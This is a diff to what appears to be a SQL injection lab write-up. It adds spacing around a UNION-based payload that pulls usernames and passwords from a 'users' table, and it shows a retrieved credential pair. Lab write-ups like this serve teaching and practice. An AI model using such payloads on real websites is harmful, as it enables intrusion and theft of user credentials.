@@ -21,7 +21,9 @@ I started off by determining how many columns were being returned by the origina
 I got an error at 3, so the original query returns 2 columns.
 
 Then I crafted this payload and injected it to retrieve the usernames and passwords from the `users` table:
+
 `filter?category=NULL' UNION SELECT username, password FROM users--`
+
 It returned this:
 
  carlos         | wdx34haxptca1rb7caqs   
